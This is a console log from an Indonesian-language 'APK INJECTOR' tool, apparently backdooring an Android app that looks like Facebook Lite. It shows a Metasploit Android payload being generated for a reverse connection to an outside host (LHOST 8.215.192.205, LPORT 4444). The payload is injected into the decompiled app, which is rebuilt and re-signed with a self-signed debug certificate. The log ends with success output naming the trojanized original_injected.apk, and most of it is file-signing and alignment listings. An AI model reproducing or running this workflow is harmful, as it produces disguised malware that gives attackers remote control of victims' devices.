=== APK INJECTOR ===
[*] Target: original.apk
[*] LHOST: 8.215.192.205
[*] LPORT: 4444
[*] Memvalidasi environment...
[*] Menyiapkan keystore...
Generating 4,096 bit RSA key pair and self-signed certificate (SHA384withRSA) with a validity of 10,000 days
	for: CN=Android Debug, O=Android, C=US
[Storing /root/.apk_tools/debug.keystore]
[*] Mendekompilasi APK...
	zip warning: name not matched: META-INF/*.SF
	zip warning: name not matched: META-INF/*.RSA
	zip warning: name not matched: META-INF/*.DSA

zip error: Nothing to do! (original.apk)
I: Using Apktool 2.7.0-dirty on original.apk
I: Copying raw resources...
I: Copying raw classes.dex file...
I: Copying assets and libs...
I: Copying unknown files...
I: Copying original files...
I: Copying META-INF/services directory
[*] Menyuntikkan payload...
[-] No platform was selected, choosing Msf::Module::Platform::Android from the payload
[-] No arch selected, selecting arch: dalvik from the payload
No encoder specified, outputting raw payload
Payload size: 10235 bytes
Saved as: /root/bacdoor-apk/apk_work_YjxRkG/payload.apk
I: Using Apktool 2.7.0-dirty on payload.apk
I: Loading resource table...
I: Decoding AndroidManifest.xml with resources...
I: Loading resource table from file: /root/.local/share/apktool/framework/1.apk
I: Regular manifest package...
I: Decoding file-resources...
I: Decoding values */* XMLs...
I: Baksmaling classes.dex...
I: Copying assets and libs...
I: Copying unknown files...
I: Copying original files...
cp: cannot create directory '/root/bacdoor-apk/apk_work_YjxRkG/original/smali/com/': No such file or directory
[*] Membangun APK baru...
I: Using Apktool 2.7.0-dirty
I: Copying /root/bacdoor-apk/apk_work_YjxRkG/original classes.dex file...
I: Checking whether resources has changed...
I: Copying raw resources...
I: Copying libs... (/lib)
I: Copying libs... (/kotlin)
I: Copying libs... (/META-INF/services)
I: Building apk file...
I: Copying unknown files/dir...
I: Built apk into: /root/bacdoor-apk/apk_work_YjxRkG/unsigned.apk
   adding: META-INF/MANIFEST.MF
   adding: META-INF/ANDROIDD.SF
   adding: META-INF/ANDROIDD.RSA
  signing: META-INF/services/kotlinx.coroutines.CoroutineExceptionHandler
  signing: resources.arsc
  signing: r/gc.glsl
  signing: r/b7.png
  signing: r/m.xml
  signing: r/fr.xml
  signing: r/g9.xml
  signing: r/c8.png
  signing: r/ff.xml
  signing: r/c.xml
  signing: r/r.png
  signing: r/gm.glsl
  signing: r/b9.png
  signing: r/dz.xml
  signing: r/fq.xml
  signing: r/dh.png
  signing: r/go.glsl
  signing: r/gn.glsl
  signing: r/7.png
  signing: r/bo.png
  signing: r/eb.xml
  signing: r/g3.glsl
  signing: r/u.png
  signing: r/-.png
  signing: r/dd.png
  signing: r/c1.png
  signing: r/bm.png
  signing: r/fk.xml
  signing: r/e0.png
  signing: r/fg.xml
  signing: r/gg.glsl
  signing: r/dc.png
  signing: r/8.png
  signing: r/bi.png
  signing: r/cz.png
  signing: r/f5.png
  signing: r/cf.png
  signing: r/d.xml
  signing: r/fd.png
  signing: r/cx.png
  signing: r/g6.glsl
  signing: r/cl.png
  signing: r/fl.xml
  signing: r/fi.xml
  signing: r/gv.glsl
  signing: r/gk
  signing: r/c6.png
  signing: r/cs.png
  signing: r/gh.glsl
  signing: r/e7.xml
  signing: r/en.xml
  signing: r/db.png
  signing: r/bg.g.png
  signing: r/bs.png
  signing: r/ge.glsl
  signing: r/bw.png
  signing: r/b-.png
  signing: r/cm.png
  signing: r/ej.xml
  signing: r/g8.glsl
  signing: r/eu.xml
  signing: r/ck.png
  signing: r/fc.png
  signing: r/hd.xml
  signing: r/cq.png
  signing: r/eh.xml
  signing: r/fs.xml
  signing: r/eg.xml
  signing: r/by.png
  signing: r/d5.xml
  signing: r/b6.png
  signing: r/f1.xml
  signing: r/dg.png
  signing: r/e1.png
  signing: r/x.g.png
  signing: r/ch.png
  signing: r/cy.png
  signing: r/di.png
  signing: r/e8.xml
  signing: r/b3.png
  signing: r/gq.glsl
  signing: r/dx.png
  signing: r/gw.glsl
  signing: r/ci.png
  signing: r/g7.glsl
  signing: r/ba.png
  signing: r/bt.png
  signing: r/gp.glsl
  signing: r/i.xml
  signing: r/ed.xml
  signing: r/gf.glsl
  signing: r/ei.xml
  signing: r/be.png
  signing: r/bq.png
  signing: r/cj.png
  signing: r/e6.xml
  signing: r/g.xml
  signing: r/dr.xml
  signing: r/d2.xml
  signing: r/ce.png
  signing: r/et.xml
  signing: r/fw.xml
  signing: r/eq.xml
  signing: r/o.xml
  signing: r/fa.png
  signing: r/d1.xml
  signing: r/bx.xml
  signing: r/dt.xml
  signing: r/el.xml
  signing: r/e5.xml
  signing: r/ew.9.png
  signing: r/a.xml
  signing: r/ee.xml
  signing: r/g2.glsl
  signing: r/e9.xml
  signing: r/9.png
  signing: r/cv.png
  signing: r/f9.png
  signing: r/fx.xml
  signing: r/ex.9.png
  signing: r/bz.png
  signing: r/l.xml
  signing: r/c7.png
  signing: r/da.png
  signing: r/bb.png
  signing: r/d6.xml
  signing: r/d_.9.png
  signing: r/w.g.png
  signing: r/ef.xml
  signing: r/e-.png
  signing: r/hf.xml
  signing: r/f_.png
  signing: r/fb.png
  signing: r/ct.png
  signing: r/c_.png
  signing: r/dn.png
  signing: r/c0.png
  signing: r/gi.glsl
  signing: r/bp.png
  signing: r/ez.9.png
  signing: r/4.png
  signing: r/s.png
  signing: r/cb.g.png
  signing: r/k.xml
  signing: r/bj.png
  signing: r/g0.glsl
  signing: r/bl.png
  signing: r/d3.xml
  signing: r/cn.png
  signing: r/do.png
  signing: r/ep.png
  signing: r/gz.glsl
  signing: r/g1.glsl
  signing: r/0.png
  signing: r/g_.xml
  signing: r/hc.xml
  signing: r/y.png
  signing: r/1.png
  signing: r/dq.xml
  signing: r/bn.png
  signing: r/j.xml
  signing: r/5.png
  signing: r/hb.xml
  signing: r/ey.9.png
  signing: r/ga.glsl
  signing: r/n.xml
  signing: r/cr.png
  signing: r/fh.xml
  signing: r/dy.xml
  signing: r/e3.xml
  signing: r/h.xml
  signing: r/bh.g.png
  signing: r/b4.png
  signing: r/z.png
  signing: r/f6.png
  signing: r/dw.png
  signing: r/f7.png
  signing: r/c3.png
  signing: r/br.png
  signing: r/gx
  signing: r/p.xml
  signing: r/dv.xml
  signing: r/_.png
  signing: r/eo.xml
  signing: r/ev.xml
  signing: r/bc.png
  signing: r/f8.png
  signing: r/em.xml
  signing: r/bv.png
  signing: r/gy.glsl
  signing: r/du.xml
  signing: r/d7.xml
  signing: r/b.xml
  signing: r/ea.xml
  signing: r/g4.glsl
  signing: r/co.png
  signing: r/c5.g.png
  signing: r/f4.png
  signing: r/gt.glsl
  signing: r/gb.glsl
  signing: r/dm.png
  signing: r/t.png
  signing: r/ec.xml
  signing: r/dj.png
  signing: r/f-.avif
  signing: r/ds.xml
  signing: r/gs.glsl
  signing: r/3.png
  signing: r/g-.xml
  signing: r/c4.g.png
  signing: r/fn.xml
  signing: r/f0.xml
  signing: r/b0.xml
  signing: r/b8.png
  signing: r/bd.png
  signing: r/d-.xml
  signing: r/dl.png
  signing: r/fv.xml
  signing: r/cd.png
  signing: r/d0.xml
  signing: r/ft.xml
  signing: r/fe.xml
  signing: r/d8
  signing: r/bf.png
  signing: r/6.png
  signing: r/gj
  signing: r/gu.glsl
  signing: r/fy.xml
  signing: r/cu.png
  signing: r/f.xml
  signing: r/dk.png
  signing: r/2.png
  signing: r/b2.xml
  signing: r/gl
  signing: r/v.png
  signing: r/fp.xml
  signing: r/cc.png
  signing: r/b1.xml
  signing: r/ek.xml
  signing: r/gr.glsl
  signing: r/d9.png
  signing: r/es.xml
  signing: r/b_.png
  signing: r/cw.png
  signing: r/gd.glsl
  signing: r/fo.xml
  signing: r/bk.png
  signing: r/f2.xml
  signing: r/c9.png
  signing: r/fu.xml
  signing: r/e4.xml
  signing: r/dp.xml
  signing: r/e_.png
  signing: r/e2.xml
  signing: r/de.png
  signing: r/fj.xml
  signing: r/g5.glsl
  signing: r/cg.png
  signing: r/he.xml
  signing: r/er.xml
  signing: r/c2.png
  signing: r/df.png
  signing: r/q.png
  signing: r/fz.xml
  signing: r/bu.png
  signing: r/e.xml
  signing: r/ca.g.png
  signing: r/f3.xml
  signing: r/b5.png
  signing: r/ha
  signing: r/d4.xml
  signing: r/fm.xml
  signing: r/cp.png
  signing: r/c-.png
  signing: lib/arm64-v8a/libbreakpad_cpp_helper.so
  signing: lib/arm64-v8a/libsuperpack-jni.so
  signing: classes.dex
  signing: AndroidManifest.xml
  signing: kotlin/kotlin.kotlin_builtins
  signing: kotlin/ranges/ranges.kotlin_builtins
  signing: kotlin/collections/collections.kotlin_builtins
  signing: kotlin/coroutines/coroutines.kotlin_builtins
  signing: kotlin/reflect/reflect.kotlin_builtins
  signing: kotlin/annotation/annotation.kotlin_builtins
  signing: kotlin/internal/internal.kotlin_builtins
  signing: assets/secondary-program-dex-jars/store-0.dex.spo
  signing: assets/secondary-program-dex-jars/metadata.txt
  signing: assets/secondary-program-dex-jars/dex_manifest.txt
  signing: assets/mc_query_hash.bin
  signing: assets/json/bloks_cds_base_screen_template.json
  signing: assets/json/bloks_screen_template.json
  signing: assets/native_deps.txt
  signing: assets/com/facebook/zero/headers/d41d8cd98f00b204e9800998ecf8427e.meta
  signing: assets/com/facebook/zero/token/d41d8cd98f00b204e9800998ecf8427e.meta
  signing: assets/com/facebook/zero/cmon/d41d8cd98f00b204e9800998ecf8427e.meta
  signing: assets/com/facebook/logginginfra/falco/f97f16f70fbcddb5725ef18a5aee3f6c.meta
  signing: assets/com/facebook/logginginfra/falco/09c222ab5ab01ebae6aebf4bd2e76642.meta
  signing: assets/fbt/default/strings.bin
  signing: assets/mc_lite_configs_and_params_list.bin
  signing: assets/fblite-client_client_persist_ids.json
  signing: assets/app_modules/contents/s_mediastreaming_msysinfra.json
  signing: assets/app_modules/contents/s_mnshttp_msys.json
  signing: assets/app_modules/contents/data2048.json
  signing: assets/app_modules/contents/s_mediastreaming_msysinfra_profilo.json
  signing: assets/app_modules/contents/data1.json
  signing: assets/app_modules/contents/data512.json
  signing: assets/app_modules/contents/s_fizz_mediastreaming.json
  signing: assets/app_modules/contents/s_blokscamera_heroplayer.json
  signing: assets/app_modules/contents/uiqr.json
  signing: assets/app_modules/contents/s_boost_msys.json
  signing: assets/app_modules/contents/s_fizz_msys.json
  signing: assets/app_modules/contents/data256.json
  signing: assets/app_modules/contents/s_mediastreaming_msys_rtc.json
  signing: assets/app_modules/contents/s_camera_mediastreaming_rtc.json
  signing: assets/app_modules/contents/s_blokscamera_msysinfra.json
  signing: assets/app_modules/contents/profilo.json
  signing: assets/app_modules/contents/fizz.json
  signing: assets/app_modules/contents/avif.json
  signing: assets/app_modules/contents/data1024.json
  signing: assets/app_modules/contents/s_blokscamera_rtc.json
  signing: assets/app_modules/contents/msysinfra.json
  signing: assets/app_modules/contents/rtc.json
  signing: assets/app_modules/contents/s_avif_heroplayer.json
  signing: assets/app_modules/contents/mnshttp.json
  signing: assets/app_modules/contents/s_mediastreaming_msys_profilo_rtc.json
  signing: assets/app_modules/contents/mediastreaming.json
  signing: assets/app_modules/contents/s_multisignalanrdetector_profilo.json
  signing: assets/app_modules/contents/heroplayer.json
  signing: assets/app_modules/contents/s_boost_mediastreaming.json
  signing: assets/app_modules/contents/blokscamera.json
  signing: assets/app_modules/contents/s_msys_rtc.json
  signing: assets/app_modules/contents/multisignalanrdetector.json
  signing: assets/app_modules/contents/s_heroplayer_rtc.json
  signing: assets/app_modules/contents/s_boost_profilo.json
  signing: assets/app_modules/contents/s_blokscamera_camera.json
  signing: assets/app_modules/contents/baseline_profiles_9_11.json
  signing: assets/app_modules/contents/s_blokscamera_heroplayer_rtc.json
  signing: assets/app_modules/contents/boost.json
  signing: assets/app_modules/contents/s_libunwindstack_profilo.json
  signing: assets/app_modules/contents/baseline_profiles_12_plus.json
  signing: assets/app_modules/contents/libunwindstack.json
  signing: assets/app_modules/contents/shared_fizz_ms_profilo.json
  signing: assets/app_modules/contents/camera.json
  signing: assets/app_modules/contents/inappbrowser.json
  signing: assets/app_modules/contents/s_avif_heroplayer_rtc.json
  signing: assets/app_modules/contents/msys.json
  signing: assets/app_modules/contents/s_mediastreaming_rtc.json
  signing: assets/app_modules/contents/data128.json
  signing: assets/app_modules/contents/s_boost_multisignalanrdetector.json
  signing: assets/lib/libs.spk.xz
  signing: assets/lib/metadata.txt
  signing: assets/app_modules.json
  signing: assets/fbpermissions.json
  signing: DebugProbesKt.bin
  signing: app-update.properties
  signing: billing.properties
  signing: core-common.properties
  signing: core-facebook.properties
  signing: firebase-annotations.properties
  signing: firebase-common.properties
  signing: firebase-components.properties
  signing: firebase-iid-interop.properties
  signing: firebase-iid.properties
  signing: firebase-measurement-connector.properties
  signing: firebase-messaging.properties
  signing: integrity.properties
  signing: play-services-auth-api-phone.properties
  signing: play-services-auth-base.properties
  signing: play-services-auth-blockstore.properties
  signing: play-services-auth.properties
  signing: play-services-base.properties
  signing: play-services-basement.properties
  signing: play-services-camera-low-light-boost.properties
  signing: play-services-fido.properties
  signing: play-services-instantapps.properties
  signing: play-services-location.properties
  signing: play-services-places-placereport.properties
  signing: play-services-safetynet.properties
  signing: play-services-stats.properties
  signing: play-services-tasks.properties
  signing: review.properties

>>> Signer
    X.509, CN=Android Debug, O=Android, C=US
    Signature algorithm: SHA384withRSA, 4096-bit key
    [trusted certificate]

jar signed.

Warning: 
The signer's certificate is self-signed.
Verifying alignment of original_injected.apk (4)...
      50 META-INF/MANIFEST.MF (OK - compressed)
   15374 META-INF/ANDROIDD.SF (OK - compressed)
   31283 META-INF/ANDROIDD.RSA (OK - compressed)
   33334 META-INF/services/kotlinx.coroutines.CoroutineExceptionHandler (OK - compressed)
   33444 resources.arsc (OK)
  150315 r/gc.glsl (OK - compressed)
  150532 r/b7.png (OK)
  150832 r/m.xml (OK - compressed)
  151275 r/fr.xml (OK - compressed)
  151674 r/g9.xml (OK - compressed)
  152060 r/c8.png (OK)
  152862 r/ff.xml (OK - compressed)
  153346 r/c.xml (OK - compressed)
  153620 r/r.png (OK)
  153862 r/gm.glsl (OK - compressed)
  155348 r/b9.png (OK)
  156278 r/dz.xml (OK - compressed)
  156563 r/fq.xml (OK - compressed)
  156816 r/dh.png (OK)
  157201 r/go.glsl (OK - compressed)
  157412 r/gn.glsl (OK - compressed)
  157628 r/7.png (OK)
  157800 r/bo.png (OK)
  158089 r/eb.xml (OK - compressed)
  158409 r/g3.glsl (OK - compressed)
  158620 r/u.png (OK)
  158876 r/-.png (OK)
  159176 r/dd.png (OK)
  160008 r/c1.png (OK)
  160436 r/bm.png (OK)
  160958 r/fk.xml (OK - compressed)
  161388 r/e0.png (OK)
  161733 r/fg.xml (OK - compressed)
  162055 r/gg.glsl (OK - compressed)
  162328 r/dc.png (OK)
  163012 r/8.png (OK)
  163508 r/bi.png (OK)
  164900 r/cz.png (OK)
  165268 r/f5.png (OK)
  166152 r/cf.png (OK)
  166352 r/d.xml (OK - compressed)
  166628 r/fd.png (OK)
  167016 r/cx.png (OK)
  167365 r/g6.glsl (OK - compressed)
  170084 r/cl.png (OK)
  170655 r/fl.xml (OK - compressed)
  171051 r/fi.xml (OK - compressed)
  172089 r/gv.glsl (OK - compressed)
  172295 r/gk (OK - compressed)
  172880 r/c6.png (OK)
  174980 r/cs.png (OK)
  175197 r/gh.glsl (OK - compressed)
  175815 r/e7.xml (OK - compressed)
  176184 r/en.xml (OK - compressed)
  176532 r/db.png (OK)
  177320 r/bg.g.png (OK)
  177644 r/bs.png (OK)
  178018 r/ge.glsl (OK - compressed)
  178320 r/bw.png (OK)
  178692 r/b-.png (OK)
  178948 r/cm.png (OK)
  179862 r/ej.xml (OK - compressed)
  180179 r/g8.glsl (OK - compressed)
  180415 r/eu.xml (OK - compressed)
  180856 r/ck.png (OK)
  181428 r/fc.png (OK)
  181644 r/hd.xml (OK - compressed)
  181912 r/cq.png (OK)
  182122 r/eh.xml (OK - compressed)
  182500 r/fs.xml (OK - compressed)
  183544 r/eg.xml (OK - compressed)
  183832 r/by.png (OK)
  184214 r/d5.xml (OK - compressed)
  184456 r/b6.png (OK)
  184630 r/f1.xml (OK - compressed)
  185072 r/dg.png (OK)
  185348 r/e1.png (OK)
  185692 r/x.g.png (OK)
  186088 r/ch.png (OK)
  186444 r/cy.png (OK)
  186672 r/di.png (OK)
  187783 r/e8.xml (OK - compressed)
  188172 r/b3.png (OK)
  188425 r/gq.glsl (OK - compressed)
  188600 r/dx.png (OK)
  189355 r/gw.glsl (OK - compressed)
  189592 r/ci.png (OK)
  189983 r/g7.glsl (OK - compressed)
  191684 r/ba.png (OK)
  192156 r/bt.png (OK)
  192455 r/gp.glsl (OK - compressed)
  192731 r/i.xml (OK - compressed)
  193182 r/ed.xml (OK - compressed)
  193522 r/gf.glsl (OK - compressed)
  193789 r/ei.xml (OK - compressed)
  194108 r/be.png (OK)
  194244 r/bq.png (OK)
  194380 r/cj.png (OK)
  194759 r/e6.xml (OK - compressed)
  195127 r/g.xml (OK - compressed)
  195399 r/dr.xml (OK - compressed)
  195696 r/d2.xml (OK - compressed)
  196060 r/ce.png (OK)
  196264 r/et.xml (OK - compressed)
  196616 r/fw.xml (OK - compressed)
  196937 r/eq.xml (OK - compressed)
  197371 r/o.xml (OK - compressed)
  197652 r/fa.png (OK)
  198117 r/d1.xml (OK - compressed)
  198563 r/bx.xml (OK - compressed)
  198894 r/dt.xml (OK - compressed)
  199255 r/el.xml (OK - compressed)
  199643 r/e5.xml (OK - compressed)
  199888 r/ew.9.png (OK)
  200251 r/a.xml (OK - compressed)
  200523 r/ee.xml (OK - compressed)
  200929 r/g2.glsl (OK - compressed)
  202317 r/e9.xml (OK - compressed)
  202656 r/9.png (OK)
  203084 r/cv.png (OK)
  203532 r/f9.png (OK)
  206253 r/fx.xml (OK - compressed)
  206580 r/ex.9.png (OK)
  207384 r/bz.png (OK)
  207643 r/l.xml (OK - compressed)
  207964 r/c7.png (OK)
  208516 r/da.png (OK)
  209252 r/bb.png (OK)
  209383 r/d6.xml (OK - compressed)
  209628 r/d_.9.png (OK)
  210380 r/w.g.png (OK)
  210805 r/ef.xml (OK - compressed)
  211212 r/e-.png (OK)
  211630 r/hf.xml (OK - compressed)
  212092 r/f_.png (OK)
  214248 r/fb.png (OK)
  214764 r/ct.png (OK)
  215096 r/c_.png (OK)
  215512 r/dn.png (OK)
  215688 r/c0.png (OK)
  216061 r/gi.glsl (OK - compressed)
  216300 r/bp.png (OK)
  216532 r/ez.9.png (OK)
  217504 r/4.png (OK)
  217908 r/s.png (OK)
  218132 r/cb.g.png (OK)
  218629 r/k.xml (OK - compressed)
  218948 r/bj.png (OK)
  219155 r/g0.glsl (OK - compressed)
  221008 r/bl.png (OK)
  221387 r/d3.xml (OK - compressed)
  221632 r/cn.png (OK)
  222140 r/do.png (OK)
  222384 r/ep.png (OK)
  222936 r/gz.glsl (OK - compressed)
  223103 r/g1.glsl (OK - compressed)
  223344 r/0.png (OK)
  223817 r/g_.xml (OK - compressed)
  224315 r/hc.xml (OK - compressed)
  224604 r/y.png (OK)
  226768 r/1.png (OK)
  227243 r/dq.xml (OK - compressed)
  227544 r/bn.png (OK)
  227885 r/j.xml (OK - compressed)
  228336 r/5.png (OK)
  228633 r/hb.xml (OK - compressed)
  230616 r/ey.9.png (OK)
  231212 r/ga.glsl (OK - compressed)
  232940 r/n.xml (OK - compressed)
  233388 r/cr.png (OK)
  234030 r/fh.xml (OK - compressed)
  235277 r/dy.xml (OK - compressed)
  235515 r/e3.xml (OK - compressed)
  235756 r/h.xml (OK - compressed)
  236032 r/bh.g.png (OK)
  236328 r/b4.png (OK)
  236616 r/z.png (OK)
  236976 r/f6.png (OK)
  238128 r/dw.png (OK)
  238568 r/f7.png (OK)
  239488 r/c3.png (OK)
  240260 r/br.png (OK)
  240405 r/gx (OK - compressed)
  259489 r/p.xml (OK - compressed)
  259770 r/dv.xml (OK - compressed)
  260088 r/_.png (OK)
  260290 r/eo.xml (OK - compressed)
  260561 r/ev.xml (OK - compressed)
  260848 r/bc.png (OK)
  261032 r/f8.png (OK)
  263639 r/em.xml (OK - compressed)
  263944 r/bv.png (OK)
  264197 r/gy.glsl (OK - compressed)
  264981 r/du.xml (OK - compressed)
  265346 r/d7.xml (OK - compressed)
  265659 r/b.xml (OK - compressed)
  265932 r/ea.xml (OK - compressed)
  266330 r/g4.glsl (OK - compressed)
  266560 r/co.png (OK)
  266996 r/c5.g.png (OK)
  267544 r/f4.png (OK)
  268464 r/gt.glsl (OK - compressed)
  268763 r/gb.glsl (OK - compressed)
  269288 r/dm.png (OK)
  270064 r/t.png (OK)
  270226 r/ec.xml (OK - compressed)
  270512 r/dj.png (OK)
  270765 r/f-.avif (OK - compressed)
  271550 r/ds.xml (OK - compressed)
  271915 r/gs.glsl (OK - compressed)
  272112 r/3.png (OK)
  272685 r/g-.xml (OK - compressed)
  272948 r/c4.g.png (OK)
  273558 r/fn.xml (OK - compressed)
  273987 r/f0.xml (OK - compressed)
  274785 r/b0.xml (OK - compressed)
  275116 r/b8.png (OK)
  276024 r/bd.png (OK)
  276235 r/d-.xml (OK - compressed)
  276640 r/dl.png (OK)
  277050 r/fv.xml (OK - compressed)
  277352 r/cd.png (OK)
  277535 r/d0.xml (OK - compressed)
  277816 r/ft.xml (OK - compressed)
  278116 r/fe.xml (OK - compressed)
  278516 r/d8 (OK)
  278556 r/bf.png (OK)
  278788 r/6.png (OK)
  278924 r/gj (OK - compressed)
  279555 r/gu.glsl (OK - compressed)
  279794 r/fy.xml (OK - compressed)
  280244 r/cu.png (OK)
  280779 r/f.xml (OK - compressed)
  281052 r/dk.png (OK)
  282220 r/2.png (OK)
  282894 r/b2.xml (OK - compressed)
  283638 r/gl (OK - compressed)
  283956 r/v.png (OK)
  284675 r/fp.xml (OK - compressed)
  284984 r/cc.png (OK)
  285380 r/b1.xml (OK - compressed)
  285620 r/ek.xml (OK - compressed)
  285935 r/gr.glsl (OK - compressed)
  286132 r/d9.png (OK)
  286639 r/es.xml (OK - compressed)
  286988 r/b_.png (OK)
  287516 r/cw.png (OK)
  287835 r/gd.glsl (OK - compressed)
  288045 r/fo.xml (OK - compressed)
  288420 r/bk.png (OK)
  288789 r/f2.xml (OK - compressed)
  289064 r/c9.png (OK)
  289325 r/fu.xml (OK - compressed)
  289616 r/e4.xml (OK - compressed)
  289856 r/dp.xml (OK - compressed)
  290196 r/e_.png (OK)
  290952 r/e2.xml (OK - compressed)
  291196 r/de.png (OK)
  292540 r/fj.xml (OK - compressed)
  293020 r/g5.glsl (OK - compressed)
  294888 r/cg.png (OK)
  295243 r/he.xml (OK - compressed)
  295681 r/er.xml (OK - compressed)
  295912 r/c2.png (OK)
  296372 r/df.png (OK)
  297040 r/q.png (OK)
  297261 r/fz.xml (OK - compressed)
  298028 r/bu.png (OK)
  298210 r/e.xml (OK - compressed)
  298484 r/ca.g.png (OK)
  299050 r/f3.xml (OK - compressed)
  299628 r/b5.png (OK)
  299957 r/ha (OK - compressed)
  300198 r/d4.xml (OK - compressed)
  300493 r/fm.xml (OK - compressed)
  300940 r/cp.png (OK)
  301092 r/c-.png (OK)
  301716 lib/arm64-v8a/libbreakpad_cpp_helper.so (OK - compressed)
  304403 lib/arm64-v8a/libsuperpack-jni.so (OK - compressed)
  398913 classes.dex (OK - compressed)
  679714 AndroidManifest.xml (OK - compressed)
  695393 kotlin/kotlin.kotlin_builtins (OK - compressed)
  700732 kotlin/ranges/ranges.kotlin_builtins (OK - compressed)
  702116 kotlin/collections/collections.kotlin_builtins (OK - compressed)
  703727 kotlin/coroutines/coroutines.kotlin_builtins (OK - compressed)
  703968 kotlin/reflect/reflect.kotlin_builtins (OK - compressed)
  705344 kotlin/annotation/annotation.kotlin_builtins (OK - compressed)
  705991 kotlin/internal/internal.kotlin_builtins (OK - compressed)
  706480 assets/secondary-program-dex-jars/store-0.dex.spo (OK)
 2533976 assets/secondary-program-dex-jars/metadata.txt (OK)
 2534180 assets/secondary-program-dex-jars/dex_manifest.txt (OK - compressed)
 2534332 assets/mc_query_hash.bin (OK)
 2534441 assets/json/bloks_cds_base_screen_template.json (OK - compressed)
 2535831 assets/json/bloks_screen_template.json (OK - compressed)
 2537508 assets/native_deps.txt (OK)
 2537753 assets/com/facebook/zero/headers/d41d8cd98f00b204e9800998ecf8427e.meta (OK - compressed)
 2537872 assets/com/facebook/zero/token/d41d8cd98f00b204e9800998ecf8427e.meta (OK - compressed)
 2537990 assets/com/facebook/zero/cmon/d41d8cd98f00b204e9800998ecf8427e.meta (OK - compressed)
 2538117 assets/com/facebook/logginginfra/falco/f97f16f70fbcddb5725ef18a5aee3f6c.meta (OK - compressed)
 2538842 assets/com/facebook/logginginfra/falco/09c222ab5ab01ebae6aebf4bd2e76642.meta (OK - compressed)
 2540028 assets/fbt/default/strings.bin (OK - compressed)
 2540200 assets/mc_lite_configs_and_params_list.bin (OK - compressed)
 2543552 assets/fblite-client_client_persist_ids.json (OK - compressed)
 2544804 assets/app_modules/contents/s_mediastreaming_msysinfra.json (OK)
 2544883 assets/app_modules/contents/s_mnshttp_msys.json (OK - compressed)
 2545121 assets/app_modules/contents/data2048.json (OK - compressed)
 2545431 assets/app_modules/contents/s_mediastreaming_msysinfra_profilo.json (OK - compressed)
 2545681 assets/app_modules/contents/data1.json (OK - compressed)
 2545961 assets/app_modules/contents/data512.json (OK - compressed)
 2546260 assets/app_modules/contents/s_fizz_mediastreaming.json (OK)
 2546352 assets/app_modules/contents/s_blokscamera_heroplayer.json (OK)
 2546421 assets/app_modules/contents/uiqr.json (OK - compressed)
 2546663 assets/app_modules/contents/s_boost_msys.json (OK - compressed)
 2546962 assets/app_modules/contents/s_fizz_msys.json (OK - compressed)
 2547192 assets/app_modules/contents/data256.json (OK - compressed)
 2547493 assets/app_modules/contents/s_mediastreaming_msys_rtc.json (OK - compressed)
 2547756 assets/app_modules/contents/s_camera_mediastreaming_rtc.json (OK - compressed)
 2548123 assets/app_modules/contents/s_blokscamera_msysinfra.json (OK - compressed)
 2548366 assets/app_modules/contents/profilo.json (OK - compressed)
 2548689 assets/app_modules/contents/fizz.json (OK - compressed)
 2549011 assets/app_modules/contents/avif.json (OK - compressed)
 2549336 assets/app_modules/contents/data1024.json (OK - compressed)
 2549626 assets/app_modules/contents/s_blokscamera_rtc.json (OK - compressed)
 2550020 assets/app_modules/contents/msysinfra.json (OK - compressed)
 2550345 assets/app_modules/contents/rtc.json (OK - compressed)
 2551367 assets/app_modules/contents/s_avif_heroplayer.json (OK - compressed)
 2551602 assets/app_modules/contents/mnshttp.json (OK - compressed)
 2551960 assets/app_modules/contents/s_mediastreaming_msys_profilo_rtc.json (OK)
 2552039 assets/app_modules/contents/mediastreaming.json (OK - compressed)
 2552398 assets/app_modules/contents/s_multisignalanrdetector_profilo.json (OK - compressed)
 2552651 assets/app_modules/contents/heroplayer.json (OK - compressed)
 2552996 assets/app_modules/contents/s_boost_mediastreaming.json (OK)
 2553072 assets/app_modules/contents/blokscamera.json (OK - compressed)
 2553404 assets/app_modules/contents/s_msys_rtc.json (OK - compressed)
 2553803 assets/app_modules/contents/multisignalanrdetector.json (OK - compressed)
 2554150 assets/app_modules/contents/s_heroplayer_rtc.json (OK - compressed)
 2554551 assets/app_modules/contents/s_boost_profilo.json (OK - compressed)
 2554799 assets/app_modules/contents/s_blokscamera_camera.json (OK - compressed)
 2555120 assets/app_modules/contents/baseline_profiles_9_11.json (OK)
 2555216 assets/app_modules/contents/s_blokscamera_heroplayer_rtc.json (OK)
 2555286 assets/app_modules/contents/boost.json (OK - compressed)
 2555628 assets/app_modules/contents/s_libunwindstack_profilo.json (OK - compressed)
 2555892 assets/app_modules/contents/baseline_profiles_12_plus.json (OK)
 2555971 assets/app_modules/contents/libunwindstack.json (OK - compressed)
 2556319 assets/app_modules/contents/shared_fizz_ms_profilo.json (OK - compressed)
 2556660 assets/app_modules/contents/camera.json (OK - compressed)
 2556899 assets/app_modules/contents/inappbrowser.json (OK - compressed)
 2557199 assets/app_modules/contents/s_avif_heroplayer_rtc.json (OK - compressed)
 2557437 assets/app_modules/contents/msys.json (OK - compressed)
 2568748 assets/app_modules/contents/s_mediastreaming_rtc.json (OK - compressed)
 2569144 assets/app_modules/contents/data128.json (OK - compressed)
 2569450 assets/app_modules/contents/s_boost_multisignalanrdetector.json (OK - compressed)
 2569684 assets/lib/libs.spk.xz (OK)
 2712033 assets/lib/metadata.txt (OK - compressed)
 2712301 assets/app_modules.json (OK - compressed)
 2714870 assets/fbpermissions.json (OK - compressed)
 2716342 DebugProbesKt.bin (OK - compressed)
 2717188 app-update.properties (OK)
 2717292 billing.properties (OK)
 2717396 core-common.properties (OK)
 2717508 core-facebook.properties (OK)
 2717632 firebase-annotations.properties (OK)
 2717768 firebase-common.properties (OK)
 2717896 firebase-components.properties (OK)
 2718036 firebase-iid-interop.properties (OK)
 2718167 firebase-iid.properties (OK - compressed)
 2718300 firebase-measurement-connector.properties (OK)
 2718457 firebase-messaging.properties (OK - compressed)
 2718576 integrity.properties (OK)
 2718700 play-services-auth-api-phone.properties (OK)
 2718860 play-services-auth-base.properties (OK)
 2719016 play-services-auth-blockstore.properties (OK)
 2719172 play-services-auth.properties (OK)
 2719308 play-services-base.properties (OK)
 2719448 play-services-basement.properties (OK)
 2719608 play-services-camera-low-light-boost.properties (OK)
 2719792 play-services-fido.properties (OK)
 2719932 play-services-instantapps.properties (OK - compressed)
 2720068 play-services-location.properties (OK)
 2720223 play-services-places-placereport.properties (OK - compressed)
 2720360 play-services-safetynet.properties (OK)
 2720504 play-services-stats.properties (OK)
 2720640 play-services-tasks.properties (OK)
 2720764 review.properties (OK)
Verification successful
[+] Berhasil! APK termodifikasi: original_injected.apk
[*] Jalankan listener dengan:
